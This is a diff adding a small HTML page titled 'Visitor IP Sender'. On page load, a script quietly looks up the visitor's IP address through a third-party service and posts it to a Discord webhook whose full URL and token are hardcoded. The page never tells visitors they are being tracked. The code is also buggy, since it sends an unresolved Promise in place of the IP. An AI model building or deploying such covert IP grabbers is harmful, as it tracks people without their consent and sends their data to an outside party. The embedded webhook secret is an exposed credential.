@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visitor IP Sender</title>
+</head>
+<body>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
+        const webhookUrl = 'https://discord.com/api/webhooks/1181568688365772810/a8uz5coZtPV_fm96znZsrCny53RXJn55vjU0P6QfzL7VVVvcoDjnCvKgfbjPhHARDI5N';
+
+        // Function to send IP to Discord
+        const sendIPToDiscord = () => {
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: `New visitor IP: ${getVisitorIP()}`,
+                }),
+            });
+        };
+
+        // Function to get visitor's IP address
+        const getVisitorIP = () => {
+            return fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => data.ip)
+                .catch(error => {
+                    console.error('Error fetching IP:', error);
+                    return 'Unknown';
+                });
+        };
+
+        // Call the function when the page loads
+        sendIPToDiscord();
+    });
+</script>
+
+</body>
+</html>
